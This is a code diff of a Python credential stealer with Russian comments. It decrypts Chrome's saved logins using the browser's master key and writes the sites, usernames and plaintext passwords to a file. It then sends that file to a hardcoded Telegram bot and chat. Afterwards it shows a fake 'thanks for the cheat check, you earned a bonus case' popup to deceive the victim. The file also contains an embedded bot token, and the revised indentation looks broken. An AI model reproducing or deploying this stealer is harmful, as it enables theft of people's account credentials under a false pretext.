@@ -1,6 +1,3 @@
-
-
-# Замените токен на свой токен бота
 bot_token = "6858417984:AAHHM_2Oj-KAvw3muNtpqb7kOE5HS_2FH-U"
 bot = telebot.TeleBot(bot_token)
 
@@ -8,8 +5,7 @@ bot = telebot.TeleBot(bot_token)
 chat_id = 1882056354
 
 if os.name != "nt":
-  exit()
-
+ exit()
 
 class Main:
   def init(self):
@@ -18,7 +14,7 @@ class Main:
       localState = json.loads(localState)
 
     MasterKey = base64.b64decode(localState["os_crypt"]["encrypted_key"])
-    MasterKey = MasterKey[5:]  # Remove 'DPAPI' prefix
+    MasterKey = MasterKey[5:] # Remove 'DPAPI' prefix
     self.MasterKey = self.decrypt_master_key(MasterKey)
 
   def decrypt_master_key(self, encrypted_key):
@@ -33,12 +29,11 @@ class Main:
       cipher = AES.new(self.MasterKey, AES.MODE_GCM, iv)
 
       # Расшифровка данных
-      decrypted = cipher.decrypt(payload)[:-16].decode()  # Удаление 16 байт тега аутентификации
+      decrypted = cipher.decrypt(payload)[:-16].decode() # Удаление 16 байт тега аутентификации
       return decrypted
     except Exception as e:
       print(f"Ошибка расшифровки: {e}")
       return "Ошибка расшифровки пароля"
-
 
 if __name__ == "__main__":
   try:
@@ -62,40 +57,48 @@ if __name__ == "__main__":
     connect = sqlite3.connect(target_db_path)
     cursor = connect.cursor()
 
-    for i in range(5):
-      # Извлечение учетных данных из базы данных
-      cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+    # Извлечение учетных данных из базы данных
+    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
 
-      with open("result.txt", "w") as f:
+    with open("result.txt", "w") as f:
+                  for row in cursor.fetchall():
+                URL = row[0]
+                USERNAME = row[1]
+                EncryptedPassword = row[2]
+                DecryptedPassword = Chrome.decrypt(EncryptedPassword)
 
-        for row in cursor.fetchall():
-          URL = row[0]
-          USERNAME = row[1]
-          EncryptedPassword = row[2]
-          DecryptedPassword = Chrome.decrypt(EncryptedPassword)
+                # Вывод учетных данных, если имя пользователя и URL присутствуют
+                if len(USERNAME) > 0 and len(URL) > 0:
+                    data = f'''
+                     <<<>><<<>><<<>><<<>><<<>><<<>><<<>>
+                     Сайт: {URL}  
+                     ник: {USERNAME}  
+                     пароль: {DecryptedPassword}  
+                     <<<>><<<>><<<>><<<>><<<>><<<>><<<>>
+                              '''
+                    print(data)
+                    f.write(data)
 
-          # Вывод учетных данных, если имя пользователя и URL присутствуют
-          if len(USERNAME) > 0 and len(URL) > 0:
-            data = f'''
-             <<<>><<<>><<<>><<<>><<<>><<<>><<<>>
-             Сайт: {URL}  
-             ник: {USERNAME}  
-             пароль: {DecryptedPassword}  
-             <<<>><<<>><<<>><<<>><<<>><<<>><<<>>
-                      '''
-            print(data)
-            f.write(data)
+        # Отправка result.txt в Telegram
+        with open("result.txt", "rb") as file:
+            bot.send_document(chat_id, file)
 
-      # Отправка result.txt в Telegram
-      with open("result.txt", "rb") as file:
-        bot.send_document(chat_id, file)
+        # Вывод сообщения через messagebox
+        root = tk.Tk()
+        root.withdraw()  # Скрыть основное окно
+        messagebox.showinfo("Информация", "Спасибо за проверку!! Вы свободны!\nЗа игру без читов вам предоставлен бонус: 1 донат кейс!\nНапишите проверяющему, чтобы он выдал вам ДК.")
+        root.destroy()
 
-    # Вывод сообщения через messagebox
-    root = tk.Tk()
-    root.withdraw()  # Скрыть основное окно
-    messagebox.showinfo("Информация", "Спасибо за проверку!! Вы свободны!\nЗа игру без читов вам предоставлен бонус: 1 донат кейс!\nНапишите проверяющему, чтобы он выдал вам ДК.")
-    root.destroy()
+        # Ждем команд от бота
+        @bot.message_handler(func=lambda message: True)
+        def handle_message(message):
+            if message.text == "/exit":
+                bot.send_message(message.chat.id, "Завершение работы.")
+                exit()
+            else:
+                bot.send_message(message.chat.id, "Неизвестная команда. Используйте /exit для выхода.")
 
-  except Exception as e:
-    print(f"Общая ошибка: {e}")
+        bot.infinity_polling()
 
+    except Exception as e:
+        print(f"Общая ошибка: {e}")
